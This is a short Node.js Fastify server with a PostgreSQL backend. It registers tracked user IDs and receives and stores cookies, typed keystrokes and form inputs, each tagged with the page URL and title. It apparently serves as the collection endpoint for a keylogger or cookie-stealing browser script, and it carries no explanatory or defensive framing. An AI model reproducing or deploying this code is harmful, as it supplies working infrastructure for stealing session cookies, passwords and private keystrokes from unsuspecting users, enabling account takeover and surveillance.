const app = require('fastify')({ logger: true })
app.register(require('fastify-cors'));
const { pg, Client } = require('pg');
const db = new Client({ connectionString: "postgresql://localhost/server"});


app.get('/', async (req, res) => {
    return {hello: 'world'}
  })


app.get('/create', async () => {
    try {
        const res = await db.query('INSERT INTO Users VALUES (DEFAULT) RETURNING id;')
        return res.rows[0].id;
    } catch (err) {
        throw new Error("You killed it.")
    }
})

app.post('/add/cookies', async (req) => {
    let body = req.body;
    try {
        let cookies = body.cookies.split(";")
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i].split("=")
            cookie = cookie.map(i => i.trim());
            await db.query('INSERT INTO Cookies VALUES ($1,NOW(),$2,$3,$4,$5);',[body.id, body.url, body.title, cookie[0], cookie[1]])
        }
        return {success: 'true'}
    } catch (err) {
        throw new Error(err)
    }
})

app.post('/add/input', async (req) => {
    let body = req.body;
    try {
        await db.query('INSERT INTO Inputs VALUES ($1,NOW(),$2,$3,$4,$5);',[body.id, body.url, body.title, body.type, body.content])
        return {success: 'true'}
    } catch (err) {
        throw new Error("Bad payload")
    }
})

app.post('/add/keystrokes', async (req) => {
    let body = req.body;
    try {
        await db.query('INSERT INTO Keystrokes VALUES ($1,NOW(),$2,$3,$4);',[body.id, body.url, body.title, body.content])
        return {sucess: 'true'}
    } catch (err) {
        throw new Error("Bad payload")
    }
})

const start = async () => {
    try {
        await db.connect();
        await app.listen(3000);
    } catch (err) {
        await db.end();
        app.log.error(err);
        process.exit(1);
    }
}
start();